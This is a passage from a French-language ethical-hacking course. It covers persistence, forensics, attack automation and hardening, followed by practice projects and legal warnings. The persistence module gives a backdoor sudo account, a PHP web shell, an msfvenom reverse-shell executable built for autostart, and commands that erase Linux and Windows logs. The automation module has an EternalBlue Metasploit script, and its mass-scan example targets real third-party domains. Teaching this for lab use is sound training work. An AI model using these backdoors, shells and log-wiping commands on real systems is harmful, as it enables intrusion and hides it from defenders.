| **Scheduled Task** | Créer une tâche qui s'exécute régulièrement | Difficile |

### 9.3 Créer un backdoor utilisateur (Linux)

```bash
# En tant qu'attaquant dans une shell
# Créer un compte caché

sudo useradd -m -s /bin/bash -G sudo backdoor
sudo passwd backdoor
# Entre un password

# Maintenant t'as un compte backdoor avec sudo

# Pour le cacher :
# Modifier /etc/passwd et /etc/shadow
# (Trop avancé pour cette formation, on te montre juste le concept)
```

### 9.4 Web Shell (PHP)

```php
<?php
// shell.php

if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Uploader ça sur le serveur web, puis :

```
http://target.com/shell.php?cmd=whoami
http://target.com/shell.php?cmd=ls
http://target.com/shell.php?cmd=cat /etc/passwd
```

### 9.5 Reverse Shell Persistant (Metasploit)

```bash
msfconsole

# Créer un executable qui crée une reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o backdoor.exe

# Uploader sur la cible
# Ajouter à la startup folder pour que ça s'exécute au reboot

# Quand la cible redémarre, elle se connecte automatiquement à toi
```

### 9.6 Couvrir tes traces

Après exploitation, effacer les logs est important.

```bash
# Sur Linux
# Voir les logs
tail -f /var/log/auth.log

# Effacer les logs (si tu es root)
rm /var/log/auth.log
rm /var/log/syslog
history -c
cat /dev/null > ~/.bash_history
```

```powershell
# Sur Windows
# Effacer les logs d'event
wevtutil cl System
wevtutil cl Application
wevtutil cl Security

# Effacer l'historique PowerShell
Clear-History
Remove-Item -Path (Get-PSReadlineOption).HistorySavePath
```

### 9.7 Exercice

1. Crée une meterpreter reverse shell
2. Crée un compte backdoor
3. Uploader une web shell
4. Fais persister avec une scheduled task
5. Couvre tes traces

(Sur ta machine de test !)

---

## Module 10 — Forensics et Incident Response (2-3 jours)

### 10.1 Forensics = enquête après une attaque

```
"On s'est fait hack. Qu'est-ce qu'il a fait ?"
"Par où il est entré ?"
"Quand ?"

Forensics essaie de répondre à ces questions.
```

### 10.2 Préserver la scène de crime

```
Règle #1 : Pas toucher à rien avant d'avoir fait une image
Chaque action change les timestamps, les logs, etc.

Image complète du disque (ex: dd) AVANT toute analyse
```

### 10.3 Analyser les logs

```bash
# Linux
# Fichiers importants
/var/log/auth.log       # Authentification
/var/log/syslog         # Système général
/var/log/apache2/access.log  # Accès web
~/.bash_history         # Commandes exécutées par user

# Chercher les connexions SSH suspectes
grep "sshd" /var/log/auth.log | grep "Accepted"

# Chercher les failed logins
grep "Failed password" /var/log/auth.log
```

```powershell
# Windows
# Event Viewer
# Security log : authentification
# System log : crashes, reboots
# Application log : erreurs d'apps

# Récupérer les logs
Get-EventLog -LogName Security -Newest 100

# Chercher les logins
Get-EventLog -LogName Security -InstanceId 4624 -Newest 10
```

### 10.4 Timeline Analysis

Créer une frise chronologique de ce qui s'est passé.

```bash
# Voir les timestamps des fichiers
ls -la /home/

# Fichier suspecte créé à une date bizarre
# → Qui l'a créée ?
# → Quel processus l'a créée ?
# → Qu'est-ce qu'il contient ?

# Utiliser des tools de timeline
# → Plaso (à installer)
```

### 10.5 Memory Analysis

L'attaquant peut être ENCORE en RAM.

```bash
# Prendre une image de la RAM
sudo dd if=/dev/mem of=memory.dump bs=1M

# Analyser avec Volatility
sudo apt install -y volatility

# Voir les processus en mémoire
volatility -f memory.dump -p windows imageinfo

# Voir les connexions réseau
volatility -f memory.dump -p windows netscan

# Voir les handles ouverts
volatility -f memory.dump -p windows handles
```

### 10.6 Incident Response Plan

Quand tu découvres une attaque :

```
1. ISOLER : Déconnecter le système du réseau (pas de destruction de preuves)
2. DOCUMENTER : Tout ce qui se passe, la date, l'heure
3. PRÉSERVER : Image complète du disque et RAM
4. ANALYSER : Les logs, les fichiers, la mémoire
5. RAPPORT : Qu'est-ce qui s'est passé, par où il est entré, quand
6. REMÉDIATION : Patcher, changer les passwords, bloquer les backdoors
```

### 10.7 Exercice

1. Crée une image d'une machine virtuelle
2. Simule une attaque (crée des fichiers suspects)
3. Analyse les logs
4. Crée une timeline
5. Présente tes résultats

---

## Module 11 — Automation et Scripts d'Attaque (3-4 jours)

### 11.1 Pourquoi automatiser ?

```
Faire un pentest à la main : 40 heures
Faire un pentest avec des scripts : 4 heures
```

### 11.2 Script Bash : Mass Reconnaissance

```bash
#!/bin/bash
# mass_recon.sh

# Fichier avec les targets (un par ligne)
TARGET_FILE=$1

if [ ! -f "$TARGET_FILE" ]; then
    echo "Usage: $0 <targets_file>"
    exit 1
fi

while read -r target; do
    echo "[+] Reconnaissance sur $target"
    
    # WHOIS
    whois "$target" > results/${target}_whois.txt 2>/dev/null
    
    # DNS
    dig "$target" > results/${target}_dns.txt 2>/dev/null
    
    # Shodan (si API key disponible)
    # curl -s "https://api.shodan.io/shodan/host/$(dig +short $target | head -1)?key=$SHODAN_KEY"
    
    echo "[✓] Fait pour $target"
done < "$TARGET_FILE"
```

**Utilisation** :

```bash
chmod +x mass_recon.sh
mkdir results
echo "google.com
github.com
amazon.com" > targets.txt
./mass_recon.sh targets.txt
```

### 11.3 Script Bash : Mass Port Scan

```bash
#!/bin/bash
# mass_scan.sh

TARGET_FILE=$1
PORTS="22,80,443,3306,5432,8080"

mkdir -p results

while read -r target; do
    echo "[+] Scanning $target"
    nmap -p $PORTS -sC -sV -oN results/${target}_nmap.txt $target
    echo "[✓] Résultats sauvegardés dans results/${target}_nmap.txt"
done < "$TARGET_FILE"
```

### 11.4 Script Python : Scanner de Répertoires Web

```python
#!/usr/bin/env python3
# web_scanner.py

import requests
import sys
import threading
from queue import Queue

def scan_path(url, path, output_file):
    try:
        response = requests.get(url + "/" + path, timeout=3)
        if response.status_code == 200:
            print(f"[+] {url}/{path} - {response.status_code}")
            with open(output_file, "a") as f:
                f.write(f"{url}/{path}\n")
    except:
        pass

def worker(url, queue, output_file):
    while True:
        path = queue.get()
        scan_path(url, path, output_file)
        queue.task_done()

if __name__ == "__main__":
    target_url = sys.argv[1]
    wordlist = sys.argv[2]
    output_file = "results.txt"
    
    # Charger la wordlist
    with open(wordlist) as f:
        paths = [line.strip() for line in f]
    
    # Créer une queue et des workers
    queue = Queue()
    
    for i in range(10):  # 10 threads
        t = threading.Thread(target=worker, args=(target_url, queue, output_file))
        t.daemon = True
        t.start()
    
    # Ajouter les paths à scanner
    for path in paths:
        queue.put(path)
    
    queue.join()
    print(f"\n[✓] Résultats dans {output_file}")
```

**Utilisation** :

```bash
chmod +x web_scanner.py
./web_scanner.py http://target.com /usr/share/wordlists/dirb/common.txt
```

### 11.5 Metasploit Automation (Resource Script)

```bash
# exploit.rc

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit
```

**Utilisation** :

```bash
msfconsole -r exploit.rc
```

### 11.6 Exercice

1. Écris un script Bash pour scanner plusieurs targets
2. Écris un script Python pour bruteforcer
3. Crée un resource script Metasploit
4. Combine les scripts pour un pentest automatisé

---

## Module 12 — Défense et Hardening (2-3 jours)

### 12.1 Apprendre à attaquer pour mieux défendre

```
"Connais-toi toi-même et connais ton ennemi"
- Sun Tzu

Si tu sais comment on t'attaque, tu peux mieux te défendre.
```

### 12.2 Firewall Hardening

```bash
# Linux avec UFW
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Autoriser seulement ce qu'il faut
sudo ufw allow 22/tcp  # SSH
sudo ufw allow 80/tcp  # HTTP
sudo ufw allow 443/tcp # HTTPS

# Voir les règles
sudo ufw show added
```

### 12.3 User & Permissions Hardening

```bash
# Linux : éviter les droits root inutiles
# Utiliser sudo pour les commandes qui le nécessitent

# Voir les users
cat /etc/passwd

# Désactiver les logins inutiles
sudo usermod -s /usr/sbin/nologin olduser

# Permissions des fichiers : trop ouvert = dangereux
chmod 600 ~/.ssh/id_rsa      # Seulement l'owner peut lire
chmod 644 ~/.ssh/id_rsa.pub  # Tout le monde peut lire la clé publique
```

### 12.4 SSH Hardening

```bash
# Configuration sécurisée de SSH
sudo nano /etc/ssh/sshd_config

# Options importantes :
PermitRootLogin no           # Pas de login root direct
PasswordAuthentication no    # Juste des clés SSH
AllowUsers user1 user2       # Seulement ces utilisateurs
Port 2222                    # Pas le port par défaut
X11Forwarding no             # Pas de X11
```

### 12.5 Patch Management

```bash
# Mettre à jour TOUT régulièrement
sudo apt update
sudo apt upgrade -y
sudo apt full-upgrade -y

# Vérifier les vulnérabilités connues
sudo apt install -y unattended-upgrades
sudo dpkg-reconfigure unattended-upgrades

# Automatiser les updates
sudo systemctl enable unattended-upgrades
```

### 12.6 Monitoring & Logging

```bash
# Voir les logs en temps réel
sudo tail -f /var/log/auth.log

# Chercher les attempts de login échoués
sudo grep "Failed password" /var/log/auth.log | wc -l

# Utiliser un SIEM (Security Information Event Management)
# → Splunk, ELK Stack, Graylog...
```

### 12.7 Password Policy

```bash
# Linux : force des passwords forts
sudo apt install -y libpam-pwquality

# Configuration
sudo nano /etc/security/pwquality.conf

# Options :
minlen=12                # Au minimum 12 caractères
dcredit=-1               # Au moins 1 chiffre
ucredit=-1               # Au moins 1 majuscule
lcredit=-1               # Au moins 1 minuscule
ocredit=-1               # Au moins 1 caractère spécial
```

### 12.8 Multi-Factor Authentication (MFA)

```bash
# Google Authenticator sur Linux
sudo apt install -y libpam-google-authenticator

# Configurer pour un user
google-authenticator

# Puis modifier /etc/pam.d/sshd pour l'utiliser
```

### 12.9 Backup & Disaster Recovery

```bash
# Backup complet du système
sudo tar -czf /backup/system_backup_$(date +%Y%m%d).tar.gz \
  --exclude=/proc --exclude=/sys --exclude=/dev \
  --exclude=/run --exclude=/boot /

# Restaurer
tar -xzf system_backup_*.tar.gz -C /
```

### 12.10 Incident Response Plan

```
AVANT une attaque :
  1. Avoir un plan écrit
  2. Équipe dédiée avec rôles clairs
  3. Contacts importants listés
  4. Outils de forensics pré-installés

PENDANT une attaque :
  1. Isoler les systèmes affectés
  2. Documenter TOUT
  3. Contacter le CERT/police si nécessaire
  4. Communiquer avec les stakeholders

APRÈS une attaque :
  1. Post-mortem : qu'est-ce qu'on a mal fait ?
  2. Patcher les failles
  3. Améliorer les process
```

### 12.11 Exercice

1. Endurcis une machine : firewall, users, SSH
2. Mets en place une politique de mots de passe
3. Configure les logs
4. Crée un plan de backup
5. Teste ta défense en simulant une attaque

---

## Projets Pratiques

### Projet 1 : Pentest d'une Application Web Vulnérable

**Objectif** : Tester une app web avec toutes les techniques apprises.

**Étapes** :

1. **Reconnaissance** : OSINT sur le domaine
2. **Scanning** : Nmap sur le serveur web
3. **Enumération** : Nikto, DIRB
4. **Exploitation** : SQL injection, XSS, etc. avec DVWA
5. **Rapport** : Documente ce que tu as trouvé

**Tools** : nmap, nikto, sqlmap, burp suite, DVWA

### Projet 2 : Cracker une Machine (HackTheBox / TryHackMe)

**Objectif** : Complet pentest d'une machine virtuelle.

**Étapes** :

1. Reconnaissance et OSINT
2. Scanning et énumération
3. Identifier les vulnérabilités
4. Exploiter une vulnérabilité
5. Escalader les privilèges
6. Trouver le flag

**Labs** : HackTheBox, TryHackMe, OverTheWire

### Projet 3 : Cracker un Wi-Fi (Ta propre Wi-Fi)

**Objectif** : Prendre ta propre Wi-Fi et vérifier sa sécurité.

**Étapes** :

1. Mettre en mode monitor
2. Scanner les réseaux
3. Capturer le handshake
4. Cracker avec John
5. Améliorer la sécurité

**Tools** : aircrack-ng, john

### Projet 4 : Créer un Exploit Personnalisé

**Objectif** : Écrire un script d'exploitation.

**Étapes** :

1. Trouver une CVE
2. Comprendre la vulnérabilité
3. Écrire un exploit en Python/Bash
4. Tester sur une VM vulnérable
5. Documenter le code

**Exemple** : Exploiter un service avec buffer overflow, SQL injection, etc.

### Projet 5 : Forensics Post-Attaque

**Objectif** : Analyser une machine compromise.

**Étapes** :

1. Faire une image complète
2. Analyser les logs
3. Voir les fichiers suspects
4. Timeline des événements
5. Rapport de forensics

**Tools** : dd, volatility, grep, plaso

---

## Ressources

### Sites de pratique

- **HackTheBox** : https://www.hackthebox.com/
- **TryHackMe** : https://tryhackme.com/
- **OverTheWire** : https://overthewire.org/wargames/
- **DVWA** : https://github.com/digininja/DVWA
- **Vulnhub** : https://www.vulnhub.com/

### Certifications

- **CEH (Certified Ethical Hacker)** : standard du hacking éthique
- **OSCP (Offensive Security Certified Professional)** : très respectée
- **CompTIA Security+** : base en sécurité
- **GPEN (GIAC Penetration Tester)** : avancé

### Documentation

- **Kali Tools** : https://tools.kali.org/
- **Metasploit Docs** : https://docs.metasploit.com/
- **OWASP** : https://owasp.org/ (Web security)
- **CWE/CVE** : https://cve.mitre.org/

### Livres

- "Penetration Testing" by Georgia Weidman
- "The Web Application Hacker's Handbook"
- "Hacking: The Art of Exploitation" by Jon Erickson
- "Mastering Kali Linux" by Raj Chandel

### YouTube

- **IppSec** : Walkthroughs HackTheBox (excellent)
- **John Hammond** : Hacking tutorials
- **NetworkChuck** : Networking + hacking
- **Cybrary** : Cours gratuits

---

## ⚠️ Rappels Légaux et Éthiques

### Avant chaque exercice, demande-toi :

✅ **Ai-je la permission écrite** de tester ce système ?  
✅ **Est-ce une machine que je contrôle complètement** ?  
✅ **Risque-je de causer du dégât** à d'autres systèmes ?  
✅ **Ai-je informé les personnes concernées** de mon test ?  

Si tu réponds "non" à l'une de ces questions, **NE LE FAIS PAS**.

### Conséquences légales

```
Hacking sans permission = Années de prison + amendes
Même "juste pour voir" = Illégal

Exception : Tests de sécurité professionnels avec contrat écrit
```

### Bug Bounty (Légal et payant !)

```
Beaucoup de grosses entreprises offrent une récompense
si tu trouves et rapportes une vulnérabilité.

- HackerOne
- Bugcrowd
- Intigriti
- Zerodium

Tu gagnes de l'argent en trouvant des failles, légalement.
```

---

## Conclusion

Tu as couvert les **principes complets du hacking éthique** avec Kali Linux.

**Récapitulatif** :

✅ Module 0 : Éthique et fondamentaux  
✅ Module 1 : Installation Kali  
✅ Module 2 : Reconnaissance (OSINT)  
✅ Module 3 : Scanning et énumération  
✅ Module 4 : Identification de vulnérabilités  
✅ Module 5 : Exploitation  
✅ Module 6 : Web security  
✅ Module 7 : Cryptographie et hashing  
✅ Module 8 : Wi-Fi hacking  
✅ Module 9 : Persistence  
✅ Module 10 : Forensics  
✅ Module 11 : Automation  
✅ Module 12 : Défense  

**Prochaines étapes** :

1. Fais TOUS les projets
2. Pratiquer sur HackTheBox / TryHackMe
3. Certifications : CEH ou OSCP
4. Devenir pentesteur professionnel
5. Bug bounty pour l'argent

> **Rappel final** : Le vrai hacking, c'est pas casser des systèmes. C'est les comprendre. Et les protéger.

Bonne chance ! 🎯

---

**Derniers mots** : 

*"With great power comes great responsibility." - Uncle Ben*

Tu as maintenant le pouvoir d'attaquer et défendre. Utilise-le sagement.
